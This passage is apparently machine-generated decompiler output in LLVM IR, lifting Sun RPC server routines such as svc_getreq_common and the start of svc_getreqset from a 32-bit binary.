  %v1_80566fd = add i32 %v1_80566f6, 184
  %storemerge.in1 = inttoptr i32 %v1_80566fd to i32*
  %storemerge2 = load i32, i32* %storemerge.in1, align 4
  store i32 %storemerge2, i32* %eax.global-to-local, align 4
  %v1_80567133 = icmp eq i32 %storemerge2, 0
  %v1_805671510 = icmp eq i1 %v1_80567133, false
  br i1 %v1_805671510, label %dec_label_pc_8056705.lr.ph, label %dec_label_pc_8056717

dec_label_pc_8056705.lr.ph:                       ; preds = %entry
  %v4_8056705.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8056705

dec_label_pc_8056705:                             ; preds = %dec_label_pc_8056705.lr.ph, %dec_label_pc_805670f
  %v0_805671814 = phi i32 [ 0, %dec_label_pc_8056705.lr.ph ], [ %v0_805670f, %dec_label_pc_805670f ]
  %v0_805670f = phi i32 [ %storemerge2, %dec_label_pc_8056705.lr.ph ], [ %storemerge, %dec_label_pc_805670f ]
  %v1_8056705 = add i32 %v0_805670f, 4
  %v2_8056705 = inttoptr i32 %v1_8056705 to i32*
  %v3_8056705 = load i32, i32* %v2_8056705, align 4
  %v15_8056705 = icmp eq i32 %v3_8056705, %v4_8056705.pre
  %v1_8056708 = icmp eq i1 %v15_8056705, false
  br i1 %v1_8056708, label %dec_label_pc_805670f, label %dec_label_pc_805670a

dec_label_pc_805670a:                             ; preds = %dec_label_pc_8056705
  %v1_805670a = add i32 %v0_805670f, 8
  %v2_805670a = inttoptr i32 %v1_805670a to i32*
  %v3_805670a = load i32, i32* %v2_805670a, align 4
  %v4_805670a = load i32, i32* @ebx, align 4
  %v15_805670a = icmp eq i32 %v3_805670a, %v4_805670a
  br i1 %v15_805670a, label %dec_label_pc_805670a.dec_label_pc_8056717_crit_edge, label %dec_label_pc_805670f

dec_label_pc_805670f:                             ; preds = %dec_label_pc_805670a, %dec_label_pc_8056705
  %storemerge.in = inttoptr i32 %v0_805670f to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8056713 = icmp eq i32 %storemerge, 0
  %v1_8056715 = icmp eq i1 %v1_8056713, false
  br i1 %v1_8056715, label %dec_label_pc_8056705, label %dec_label_pc_8056713.dec_label_pc_8056717_crit_edge

dec_label_pc_805670a.dec_label_pc_8056717_crit_edge: ; preds = %dec_label_pc_805670a
  br label %dec_label_pc_8056717

dec_label_pc_8056713.dec_label_pc_8056717_crit_edge: ; preds = %dec_label_pc_805670f
  br label %dec_label_pc_8056717

dec_label_pc_8056717:                             ; preds = %dec_label_pc_8056713.dec_label_pc_8056717_crit_edge, %dec_label_pc_805670a.dec_label_pc_8056717_crit_edge, %entry
  %v0_8056718 = phi i32 [ %v0_805670f, %dec_label_pc_8056713.dec_label_pc_8056717_crit_edge ], [ %v0_805671814, %dec_label_pc_805670a.dec_label_pc_8056717_crit_edge ], [ 0, %entry ]
  %v2_8056717 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8056717, i32* @ebx, align 4
  %v1_8056718 = load i32, i32* @esi, align 4
  %v2_8056718 = inttoptr i32 %v1_8056718 to i32*
  store i32 %v0_8056718, i32* %v2_8056718, align 4
  store i32 %v0_80566f0, i32* @esi, align 4
  store i32 %v0_80566ed, i32* @edi, align 4
  %v0_805671c = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_805671c

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_805670f, { 0, 2, 3, 4, 1 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8056705, { 1, 0 }
}

define i32 @svc_getreq_common(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-896 = alloca i32, align 4
  %stack_var_-1296 = alloca i32, align 4
  %v4_805672b = ptrtoint i32* %stack_var_-1296 to i32
  %v2_8056732 = ptrtoint i32* %stack_var_-896 to i32
  store i32 %v2_8056732, i32* %eax.global-to-local, align 4
  %v1_8056740 = call i32 @__rpc_thread_variables(i32 %v4_805672b)
  store i32 %v1_8056740, i32* %eax.global-to-local, align 4
  %v1_8056745 = add i32 %v1_8056740, 180
  %v2_8056745 = inttoptr i32 %v1_8056745 to i32*
  %v3_8056745 = load i32, i32* %v2_8056745, align 4
  store i32 %v3_8056745, i32* @edx, align 4
  store i32 %v1_8056740, i32* %ebp.global-to-local, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v2_8056754 = mul i32 %arg1, 4
  %v3_8056754 = add i32 %v3_8056745, %v2_8056754
  %v4_8056754 = inttoptr i32 %v3_8056754 to i32*
  %v5_8056754 = load i32, i32* %v4_8056754, align 4
  store i32 %v5_8056754, i32* @ebx, align 4
  %v1_8056757 = icmp eq i32 %v5_8056754, 0
  br i1 %v1_8056757, label %entry.dec_label_pc_80568ae_crit_edge, label %dec_label_pc_805675f.preheader

entry.dec_label_pc_80568ae_crit_edge:             ; preds = %entry
  %v0_80568ae.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80568ae

dec_label_pc_805675f.preheader:                   ; preds = %entry
  %v1_8056761 = add i32 %v5_8056754, 8
  %v2_8056761 = inttoptr i32 %v1_8056761 to i32*
  %v3_80567cc = bitcast i32* %stack_var_-896 to i16*
  %v1_805675f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805675f

dec_label_pc_805675f:                             ; preds = %dec_label_pc_805675f.preheader, %dec_label_pc_80568a7
  %v1_805675f = phi i32 [ %v1_805675f.pre, %dec_label_pc_805675f.preheader ], [ %v1_8056891, %dec_label_pc_80568a7 ]
  %v0_805675f = phi i32 [ %arg1, %dec_label_pc_805675f.preheader ], [ 0, %dec_label_pc_80568a7 ]
  %v2_805675f = add i32 %v1_805675f, -4
  %v3_805675f = inttoptr i32 %v2_805675f to i32*
  store i32 %v0_805675f, i32* %v3_805675f, align 4
  %v0_8056760 = load i32, i32* %eax.global-to-local, align 4
  %v2_8056760 = add i32 %v1_805675f, -8
  %v3_8056760 = inttoptr i32 %v2_8056760 to i32*
  store i32 %v0_8056760, i32* %v3_8056760, align 4
  %v3_8056761 = load i32, i32* %v2_8056761, align 4
  store i32 %v3_8056761, i32* %eax.global-to-local, align 4
  %v1_8056764 = add i32 %v1_805675f, 1212
  store i32 %v1_8056764, i32* @esi, align 4
  %v2_805676b = add i32 %v1_805675f, -12
  %v3_805676b = inttoptr i32 %v2_805676b to i32*
  store i32 %v1_8056764, i32* %v3_805676b, align 4
  %v2_805676c = add i32 %v1_805675f, -16
  %v3_805676c = inttoptr i32 %v2_805676c to i32*
  store i32 %v5_8056754, i32* %v3_805676c, align 4
  %v1_805676d = add i32 %v1_805675f, -20
  %v2_805676d = inttoptr i32 %v1_805676d to i32*
  store i32 134571887, i32* %v2_805676d, align 4
  %v4_805676d = inttoptr i32 %v3_8056761 to i32*
  %v5_805676d = load i32, i32* %v4_805676d, align 4
  call void @__pseudo_call(i32 %v5_805676d)
  %v0_805676f = load i32, i32* @esp, align 4
  %v1_8056772 = icmp eq i32 %v3_8056761, 0
  br i1 %v1_8056772, label %dec_label_pc_8056887, label %dec_label_pc_805677a

dec_label_pc_805677a:                             ; preds = %dec_label_pc_805675f
  %v1_805677a = add i32 %v0_805676f, 828
  store i32 %v1_805677a, i32* %eax.global-to-local, align 4
  %v2_8056781 = add i32 %v0_805676f, 1300
  %v3_8056781 = inttoptr i32 %v2_8056781 to i32*
  store i32 %v1_805677a, i32* %v3_8056781, align 4
  %v0_8056788 = load i32, i32* @esp, align 4
  %v1_8056788 = add i32 %v0_8056788, 1224
  %v2_8056788 = inttoptr i32 %v1_8056788 to i32*
  %v3_8056788 = load i32, i32* %v2_8056788, align 4
  store i32 %v3_8056788, i32* %eax.global-to-local, align 4
  %v1_805678f = add i32 %v0_8056788, 1272
  store i32 %v1_805678f, i32* %edx.global-to-local, align 4
  %v2_8056796 = add i32 %v0_8056788, 1288
  %v3_8056796 = inttoptr i32 %v2_8056796 to i32*
  store i32 %v5_8056754, i32* %v3_8056796, align 4
  %v0_805679d = load i32, i32* %eax.global-to-local, align 4
  %v1_805679d = load i32, i32* @esp, align 4
  %v2_805679d = add i32 %v1_805679d, 1260
  %v3_805679d = inttoptr i32 %v2_805679d to i32*
  store i32 %v0_805679d, i32* %v3_805679d, align 4
  %v0_80567a4 = load i32, i32* @esp, align 4
  %v1_80567a4 = add i32 %v0_80567a4, 1228
  %v2_80567a4 = inttoptr i32 %v1_80567a4 to i32*
  %v3_80567a4 = load i32, i32* %v2_80567a4, align 4
  store i32 %v3_80567a4, i32* %eax.global-to-local, align 4
  %v2_80567ab = add i32 %v0_80567a4, 1264
  %v3_80567ab = inttoptr i32 %v2_80567ab to i32*
  store i32 %v3_80567a4, i32* %v3_80567ab, align 4
  %v0_80567b2 = load i32, i32* @esp, align 4
  %v1_80567b2 = add i32 %v0_80567b2, 1232
  %v2_80567b2 = inttoptr i32 %v1_80567b2 to i32*
  %v3_80567b2 = load i32, i32* %v2_80567b2, align 4
  %v2_80567b9 = add i32 %v0_80567b2, 1268
  %v3_80567b9 = inttoptr i32 %v2_80567b9 to i32*
  store i32 %v3_80567b2, i32* %v3_80567b9, align 4
  %v0_80567c0 = load i32, i32* @esp, align 4
  %v1_80567c0 = add i32 %v0_80567c0, 1236
  store i32 %v1_80567c0, i32* %eax.global-to-local, align 4
  %v0_80567c7 = load i32, i32* @edi, align 4
  %v2_80567c7 = add i32 %v0_80567c0, -4
  %v3_80567c7 = inttoptr i32 %v2_80567c7 to i32*
  store i32 %v0_80567c7, i32* %v3_80567c7, align 4
  %v1_80567c8 = add i32 %v0_80567c0, -8
  %v2_80567c8 = inttoptr i32 %v1_80567c8 to i32*
  store i32 12, i32* %v2_80567c8, align 4
  %v0_80567ca = load i32, i32* %eax.global-to-local, align 4
  %v2_80567ca = add i32 %v0_80567c0, -12
  %v3_80567ca = inttoptr i32 %v2_80567ca to i32*
  store i32 %v0_80567ca, i32* %v3_80567ca, align 4
  %v0_80567cb = load i32, i32* %edx.global-to-local, align 4
  %v2_80567cb = add i32 %v0_80567c0, -16
  %v3_80567cb = inttoptr i32 %v2_80567cb to i32*
  store i32 %v0_80567cb, i32* %v3_80567cb, align 4
  %v4_80567cc = call i32 @memcpy(i16* %v3_80567cc, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80567cc, i32* %eax.global-to-local, align 4
  %v0_80567d1 = load i32, i32* @esp, align 4
  %v1_80567d4 = add i32 %v0_80567d1, 1252
  %v2_80567d4 = inttoptr i32 %v1_80567d4 to i32*
  %v3_80567d4 = load i32, i32* %v2_80567d4, align 4
  %v4_80567d4 = icmp eq i32 %v3_80567d4, 0
  %v1_80567dc = icmp eq i1 %v4_80567d4, false
  br i1 %v1_80567dc, label %dec_label_pc_80567fd, label %dec_label_pc_80567de

dec_label_pc_80567de:                             ; preds = %dec_label_pc_805677a
  %v0_80567de = load i32, i32* @global_var_8067e20.297, align 32
  store i32 %v0_80567de, i32* %eax.global-to-local, align 4
  %v1_80567e3 = add i32 %v0_80567d1, 1304
  %v2_80567e3 = inttoptr i32 %v1_80567e3 to i32*
  %v3_80567e3 = load i32, i32* %v2_80567e3, align 4
  store i32 %v3_80567e3, i32* %edx.global-to-local, align 4
  %v2_80567ea = add i32 %v3_80567e3, 32
  %v3_80567ea = inttoptr i32 %v2_80567ea to i32*
  store i32 %v0_80567de, i32* %v3_80567ea, align 4
  %v0_80567ed = load i32, i32* @esp, align 4
  %v1_80567ed = add i32 %v0_80567ed, 1288
  %v2_80567ed = inttoptr i32 %v1_80567ed to i32*
  %v3_80567ed = load i32, i32* %v2_80567ed, align 4
  store i32 %v3_80567ed, i32* %eax.global-to-local, align 4
  %v1_80567f4 = add i32 %v3_80567ed, 40
  %v2_80567f4 = inttoptr i32 %v1_80567f4 to i32*
  store i32 0, i32* %v2_80567f4, align 4
  br label %dec_label_pc_805681f

dec_label_pc_80567fd:                             ; preds = %dec_label_pc_805677a
  %v0_80567fd = load i32, i32* @ecx, align 4
  %v2_80567fd = add i32 %v0_80567d1, 12
  %v3_80567fd = inttoptr i32 %v2_80567fd to i32*
  store i32 %v0_80567fd, i32* %v3_80567fd, align 4
  %v0_80567fe = load i32, i32* @ecx, align 4
  %v2_80567fe = add i32 %v0_80567d1, 8
  %v3_80567fe = inttoptr i32 %v2_80567fe to i32*
  store i32 %v0_80567fe, i32* %v3_80567fe, align 4
  %v0_80567ff = load i32, i32* @esi, align 4
  %v2_80567ff = add i32 %v0_80567d1, 4
  %v3_80567ff = inttoptr i32 %v2_80567ff to i32*
  store i32 %v0_80567ff, i32* %v3_80567ff, align 4
  %v1_8056800 = add i32 %v0_80567d1, 1276
  store i32 %v1_8056800, i32* %eax.global-to-local, align 4
  %v3_8056807 = inttoptr i32 %v0_80567d1 to i32*
  store i32 %v1_8056800, i32* %v3_8056807, align 4
  %v0_8056808 = call i32 @_authenticate()
  store i32 %v0_8056808, i32* %eax.global-to-local, align 4
  %v0_805680d = load i32, i32* @esp, align 4
  %v1_8056810 = icmp eq i32 %v0_8056808, 0
  br i1 %v1_8056810, label %dec_label_pc_805681f, label %dec_label_pc_8056814

dec_label_pc_8056814:                             ; preds = %dec_label_pc_80567fd
  %v0_8056814 = load i32, i32* @edx, align 4
  %v2_8056814 = add i32 %v0_805680d, 12
  %v3_8056814 = inttoptr i32 %v2_8056814 to i32*
  store i32 %v0_8056814, i32* %v3_8056814, align 4
  %v0_8056815 = load i32, i32* @edx, align 4
  %v2_8056815 = add i32 %v0_805680d, 8
  %v3_8056815 = inttoptr i32 %v2_8056815 to i32*
  store i32 %v0_8056815, i32* %v3_8056815, align 4
  %v0_8056816 = load i32, i32* %eax.global-to-local, align 4
  %v2_8056816 = add i32 %v0_805680d, 4
  %v3_8056816 = inttoptr i32 %v2_8056816 to i32*
  store i32 %v0_8056816, i32* %v3_8056816, align 4
  %v3_8056817 = inttoptr i32 %v0_805680d to i32*
  store i32 %v5_8056754, i32* %v3_8056817, align 4
  %v2_8056818 = call i32 @svcerr_auth(i32 %v2_8056732, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8056818, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056884

dec_label_pc_805681f:                             ; preds = %dec_label_pc_80567fd, %dec_label_pc_80567de
  %v0_805681f = load i32, i32* %ebp.global-to-local, align 4
  %v1_805681f = add i32 %v0_805681f, 184
  %v2_805681f = inttoptr i32 %v1_805681f to i32*
  %v3_805681f = load i32, i32* %v2_805681f, align 4
  store i32 %v3_805681f, i32* @edx, align 4
  store i32 -1, i32* @esi, align 4
  store i32 0, i32* @edi, align 4
  store i32 0, i32* @ecx, align 4
  %v1_80568583 = icmp eq i32 %v3_805681f, 0
  %v1_805685a10 = icmp eq i1 %v1_80568583, false
  br i1 %v1_805685a10, label %dec_label_pc_805682e.lr.ph, label %dec_label_pc_805685c.thread

dec_label_pc_805685c.thread:                      ; preds = %dec_label_pc_805681f
  %v0_805687b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805687b

dec_label_pc_805682e.lr.ph:                       ; preds = %dec_label_pc_805681f
  %v1_8056831.pre = load i32, i32* @esp, align 4
  %v2_8056831 = add i32 %v1_8056831.pre, 1260
  %v3_8056831 = inttoptr i32 %v2_8056831 to i32*
  %v2_805683d = add i32 %v1_8056831.pre, 1264
  %v3_805683d = inttoptr i32 %v2_805683d to i32*
  br label %dec_label_pc_805682e

dec_label_pc_805682e:                             ; preds = %dec_label_pc_805682e.lr.ph, %dec_label_pc_8056856
  %v0_805685c22 = phi i32 [ 0, %dec_label_pc_805682e.lr.ph ], [ %v0_805685c21, %dec_label_pc_8056856 ]
  %v1_8056850 = phi i32 [ 0, %dec_label_pc_805682e.lr.ph ], [ %v1_805685019, %dec_label_pc_8056856 ]
  %v3_805684d = phi i32 [ -1, %dec_label_pc_805682e.lr.ph ], [ %v0_805686b17, %dec_label_pc_8056856 ]
  %v0_8056856 = phi i32 [ %v3_805681f, %dec_label_pc_805682e.lr.ph ], [ %v2_8056856, %dec_label_pc_8056856 ]
  %v1_805682e = add i32 %v0_8056856, 4
  %v2_805682e = inttoptr i32 %v1_805682e to i32*
  %v3_805682e = load i32, i32* %v2_805682e, align 4
  store i32 %v3_805682e, i32* %eax.global-to-local, align 4
  %v4_8056831 = load i32, i32* %v3_8056831, align 4
  %v15_8056831 = icmp eq i32 %v3_805682e, %v4_8056831
  %v1_8056838 = icmp eq i1 %v15_8056831, false
  br i1 %v1_8056838, label %dec_label_pc_8056856, label %dec_label_pc_805683a

dec_label_pc_805683a:                             ; preds = %dec_label_pc_805682e
  %v1_805683a = add i32 %v0_8056856, 8
  %v2_805683a = inttoptr i32 %v1_805683a to i32*
  %v3_805683a = load i32, i32* %v2_805683a, align 4
  store i32 %v3_805683a, i32* %eax.global-to-local, align 4
  %v4_805683d = load i32, i32* %v3_805683d, align 4
  %v15_805683d = icmp eq i32 %v3_805683a, %v4_805683d
  br i1 %v15_805683d, label %dec_label_pc_805686b, label %dec_label_pc_8056846

dec_label_pc_8056846:                             ; preds = %dec_label_pc_805683a
  store i32 1, i32* @ecx, align 4
  %tmp35 = icmp ule i32 %v3_805684d, %v3_805683a
  %v5_805684d = select i1 %tmp35, i32 %v3_805684d, i32 %v3_805683a
  store i32 %v5_805684d, i32* @esi, align 4
  %tmp36 = icmp ugt i32 %v3_805683a, %v1_8056850
  br i1 %tmp36, label %dec_label_pc_8056854, label %dec_label_pc_8056856

dec_label_pc_8056854:                             ; preds = %dec_label_pc_8056846
  store i32 %v3_805683a, i32* @edi, align 4
  br label %dec_label_pc_8056856

dec_label_pc_8056856:                             ; preds = %dec_label_pc_8056846, %dec_label_pc_805682e, %dec_label_pc_8056854
  %v0_8056860 = phi i32 [ %v3_805683a, %dec_label_pc_8056846 ], [ %v3_805682e, %dec_label_pc_805682e ], [ %v3_805683a, %dec_label_pc_8056854 ]
  %v1_805685019 = phi i32 [ %v1_8056850, %dec_label_pc_8056846 ], [ %v1_8056850, %dec_label_pc_805682e ], [ %v3_805683a, %dec_label_pc_8056854 ]
  %v0_805685c21 = phi i32 [ 1, %dec_label_pc_8056846 ], [ %v0_805685c22, %dec_label_pc_805682e ], [ 1, %dec_label_pc_8056854 ]
  %v0_805686b17 = phi i32 [ %v5_805684d, %dec_label_pc_8056846 ], [ %v3_805684d, %dec_label_pc_805682e ], [ %v5_805684d, %dec_label_pc_8056854 ]
  %v1_8056856 = inttoptr i32 %v0_8056856 to i32*
  %v2_8056856 = load i32, i32* %v1_8056856, align 4
  store i32 %v2_8056856, i32* @edx, align 4
  %v1_8056858 = icmp eq i32 %v2_8056856, 0
  %v1_805685a = icmp eq i1 %v1_8056858, false
  br i1 %v1_805685a, label %dec_label_pc_805682e, label %dec_label_pc_805685c

dec_label_pc_805685c:                             ; preds = %dec_label_pc_8056856
  %v1_805685c = icmp eq i32 %v0_805685c21, 0
  br i1 %v1_805685c, label %dec_label_pc_805687b, label %dec_label_pc_8056860

dec_label_pc_8056860:                             ; preds = %dec_label_pc_805685c
  %v2_8056860 = add i32 %v1_8056831.pre, -4
  %v3_8056860 = inttoptr i32 %v2_8056860 to i32*
  store i32 %v0_8056860, i32* %v3_8056860, align 4
  %v0_8056861 = load i32, i32* @edi, align 4
  %v2_8056861 = add i32 %v1_8056831.pre, -8
  %v3_8056861 = inttoptr i32 %v2_8056861 to i32*
  store i32 %v0_8056861, i32* %v3_8056861, align 4
  %v0_8056862 = load i32, i32* @esi, align 4
  %v2_8056862 = add i32 %v1_8056831.pre, -12
  %v3_8056862 = inttoptr i32 %v2_8056862 to i32*
  store i32 %v0_8056862, i32* %v3_8056862, align 4
  %v2_8056863 = add i32 %v1_8056831.pre, -16
  %v3_8056863 = inttoptr i32 %v2_8056863 to i32*
  store i32 %v5_8056754, i32* %v3_8056863, align 4
  %v0_8056864 = call i32 @svcerr_progvers()
  store i32 %v0_8056864, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056884

dec_label_pc_805686b:                             ; preds = %dec_label_pc_805683a
  %v2_805686b = add i32 %v1_8056831.pre, -4
  %v3_805686b = inttoptr i32 %v2_805686b to i32*
  store i32 %v3_805684d, i32* %v3_805686b, align 4
  %v0_805686c = load i32, i32* @esi, align 4
  %v2_805686c = add i32 %v1_8056831.pre, -8
  %v3_805686c = inttoptr i32 %v2_805686c to i32*
  store i32 %v0_805686c, i32* %v3_805686c, align 4
  %v2_805686d = add i32 %v1_8056831.pre, -12
  %v3_805686d = inttoptr i32 %v2_805686d to i32*
  store i32 %v5_8056754, i32* %v3_805686d, align 4
  store i32 %v2_8056831, i32* %eax.global-to-local, align 4
  %v2_8056875 = add i32 %v1_8056831.pre, -16
  %v3_8056875 = inttoptr i32 %v2_8056875 to i32*
  store i32 %v2_8056831, i32* %v3_8056875, align 4
  %v1_8056876 = add i32 %v1_8056831.pre, -20
  %v2_8056876 = inttoptr i32 %v1_8056876 to i32*
  store i32 134572153, i32* %v2_8056876, align 4
  %v3_8056876 = load i32, i32* @edx, align 4
  %v4_8056876 = add i32 %v3_8056876, 12
  %v5_8056876 = inttoptr i32 %v4_8056876 to i32*
  %v6_8056876 = load i32, i32* %v5_8056876, align 4
  call void @__pseudo_call(i32 %v6_8056876)
  br label %dec_label_pc_8056884

dec_label_pc_805687b:                             ; preds = %dec_label_pc_805685c.thread, %dec_label_pc_805685c
  %v0_805687b = phi i32 [ %v0_805687b.pre, %dec_label_pc_805685c.thread ], [ %v1_8056831.pre, %dec_label_pc_805685c ]
  %v2_805687e = add i32 %v0_805687b, -16
  %v3_805687e = inttoptr i32 %v2_805687e to i32*
  store i32 %v5_8056754, i32* %v3_805687e, align 4
  %v0_805687f = call i32 @__GI_svcerr_noprog()
  store i32 %v0_805687f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056884

dec_label_pc_8056884:                             ; preds = %dec_label_pc_805686b, %dec_label_pc_8056860, %dec_label_pc_8056814, %dec_label_pc_805687b
  %v0_8056884 = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056887

dec_label_pc_8056887:                             ; preds = %dec_label_pc_805675f, %dec_label_pc_8056884
  %v0_805688a.in = phi i32 [ %v0_805676f, %dec_label_pc_805675f ], [ %v0_8056884, %dec_label_pc_8056884 ]
  %v3_8056887 = load i32, i32* %v2_8056761, align 4
  store i32 %v3_8056887, i32* %eax.global-to-local, align 4
  %v3_805688d = inttoptr i32 %v0_805688a.in to i32*
  store i32 %v5_8056754, i32* %v3_805688d, align 4
  %v1_805688e = add i32 %v0_805688a.in, -4
  %v2_805688e = inttoptr i32 %v1_805688e to i32*
  store i32 134572177, i32* %v2_805688e, align 4
  %v4_805688e = add i32 %v3_8056887, 4
  %v5_805688e = inttoptr i32 %v4_805688e to i32*
  %v6_805688e = load i32, i32* %v5_805688e, align 4
  call void @__pseudo_call(i32 %v6_805688e)
  %v0_8056891 = load i32, i32* @esp, align 4
  %v1_8056891 = add i32 %v0_8056891, 16
  %v1_8056894 = icmp eq i32 %v3_8056887, 0
  %v1_8056896 = icmp eq i1 %v1_8056894, false
  br i1 %v1_8056896, label %dec_label_pc_80568a7, label %dec_label_pc_8056898

dec_label_pc_8056898:                             ; preds = %dec_label_pc_8056887
  %v3_8056898 = load i32, i32* %v2_8056761, align 4
  store i32 %v3_8056898, i32* %eax.global-to-local, align 4
  %v3_805689e = inttoptr i32 %v0_8056891 to i32*
  store i32 %v5_8056754, i32* %v3_805689e, align 4
  %v1_805689f = add i32 %v0_8056891, -4
  %v2_805689f = inttoptr i32 %v1_805689f to i32*
  store i32 134572194, i32* %v2_805689f, align 4
  %v3_805689f = load i32, i32* %eax.global-to-local, align 4
  %v4_805689f = add i32 %v3_805689f, 20
  %v5_805689f = inttoptr i32 %v4_805689f to i32*
  %v6_805689f = load i32, i32* %v5_805689f, align 4
  call void @__pseudo_call(i32 %v6_805689f)
  %v0_80568a2 = load i32, i32* @esp, align 4
  %v1_80568a2 = add i32 %v0_80568a2, 16
  %v0_80568b8.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80568ae

dec_label_pc_80568a7:                             ; preds = %dec_label_pc_8056887
  %v1_80568a7 = add i32 %v3_8056887, -1
  %v8_80568a7 = icmp eq i32 %v1_80568a7, 0
  store i32 %v1_80568a7, i32* %eax.global-to-local, align 4
  br i1 %v8_80568a7, label %dec_label_pc_805675f, label %dec_label_pc_80568ae

dec_label_pc_80568ae:                             ; preds = %dec_label_pc_80568a7, %entry.dec_label_pc_80568ae_crit_edge, %dec_label_pc_8056898
  %v0_80568b8 = phi i32 [ %arg1, %entry.dec_label_pc_80568ae_crit_edge ], [ %v0_80568b8.pre, %dec_label_pc_8056898 ], [ %v1_80568a7, %dec_label_pc_80568a7 ]
  %v0_80568ae = phi i32 [ %v0_80568ae.pre, %entry.dec_label_pc_80568ae_crit_edge ], [ %v1_80568a2, %dec_label_pc_8056898 ], [ %v1_8056891, %dec_label_pc_80568a7 ]
  %v1_80568ae = add i32 %v0_80568ae, 1292
  %v6_80568ae = xor i32 %v0_80568ae, -2147483648
  %v7_80568ae = and i32 %v1_80568ae, %v6_80568ae
  %v8_80568ae = icmp slt i32 %v7_80568ae, 0
  store i1 %v8_80568ae, i1* @of, align 1
  %v1_80568b4 = inttoptr i32 %v1_80568ae to i32*
  %v2_80568b4 = load i32, i32* %v1_80568b4, align 4
  store i32 %v2_80568b4, i32* @ebx, align 4
  %v3_80568b4 = add i32 %v0_80568ae, 1296
  %v1_80568b5 = inttoptr i32 %v3_80568b4 to i32*
  %v2_80568b5 = load i32, i32* %v1_80568b5, align 4
  store i32 %v2_80568b5, i32* @esi, align 4
  %v3_80568b5 = add i32 %v0_80568ae, 1300
  %v1_80568b6 = inttoptr i32 %v3_80568b5 to i32*
  %v2_80568b6 = load i32, i32* %v1_80568b6, align 4
  store i32 %v2_80568b6, i32* @edi, align 4
  %v3_80568b6 = add i32 %v0_80568ae, 1304
  %v1_80568b7 = inttoptr i32 %v3_80568b6 to i32*
  %v2_80568b7 = load i32, i32* %v1_80568b7, align 4
  store i32 %v2_80568b7, i32* @ebp, align 4
  ret i32 %v0_80568b8

; uselistorder directives
  uselistorder i32 %v0_80568ae, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_80568a7, { 0, 2, 1 }
  uselistorder i32 %v3_8056887, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8056856, { 1, 2, 0 }
  uselistorder i32 %v3_805683a, { 4, 0, 1, 3, 7, 6, 5, 2, 8 }
  uselistorder i32 %v3_805684d, { 0, 3, 1, 2 }
  uselistorder i32 %v1_8056850, { 2, 1, 0 }
  uselistorder i32 %v2_8056831, { 1, 0, 2 }
  uselistorder i32 %v1_8056831.pre, { 0, 11, 10, 9, 8, 7, 4, 3, 2, 1, 6, 5 }
  uselistorder i32 %v0_805680d, { 3, 0, 1, 2 }
  uselistorder i32 %v0_80567d1, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_805675f, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v5_8056754, { 0, 3, 5, 6, 1, 2, 4, 8, 7, 9, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26 }
  uselistorder i32 -2147483648, { 12, 6, 10, 13, 4, 7, 16, 0, 1, 2, 8, 11, 9, 3, 5, 15, 14 }
  uselistorder i32 (i32, i32)* @svcerr_auth, { 1, 0 }
  uselistorder i32 1304, { 1, 0 }
  uselistorder i32 1300, { 1, 0 }
  uselistorder i32 -20, { 3, 2, 4, 5, 0, 7, 6, 1 }
  uselistorder i32 %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_80568ae, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8056887, { 1, 0 }
  uselistorder label %dec_label_pc_8056884, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805687b, { 1, 0 }
  uselistorder label %dec_label_pc_8056856, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805682e, { 1, 0 }
  uselistorder label %dec_label_pc_805675f, { 1, 0 }
}

define i32 @svc_getreqset(i32* %arg1) local_unnamed_addr {
entry:
  %tmp7 = ptrtoint i32* %arg1 to i32
  store i32 0, i32* @ebp, align 4
  %v0_80568bd = load i32, i32* @esi, align 4
  %v0_80568be = load i32, i32* @ebx, align 4
  %v2_80568c2 = call i32 @_rpc_dtablesize(i32 %v0_80568be, i32 %v0_80568bd)
  store i32 %tmp7, i32* @edi, align 4
  %v0_8056909.pre = load i32, i32* @ebp, align 4
  %v5_805690d25 = icmp slt i32 %v0_8056909.pre, %v2_80568c2
  br i1 %v5_805690d25, label %dec_label_pc_80568d1.lr.ph, label %entry.dec_label_pc_805690f_crit_edge

entry.dec_label_pc_805690f_crit_edge:             ; preds = %entry
  br label %dec_label_pc_805690f

dec_label_pc_80568d1.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_80568d1

dec_label_pc_80568d1:                             ; preds = %dec_label_pc_80568d1.lr.ph, %dec_label_pc_8056903
  %v0_80568d126 = phi i32 [ %tmp7, %dec_label_pc_80568d1.lr.ph ], [ %v1_8056903, %dec_label_pc_8056903 ]
  %v1_80568d1 = inttoptr i32 %v0_80568d126 to i32*
  %v2_80568d1 = load i32, i32* %v1_80568d1, align 4
  br label %dec_label_pc_80568f1

dec_label_pc_80568d5:                             ; preds = %dec_label_pc_80568f1
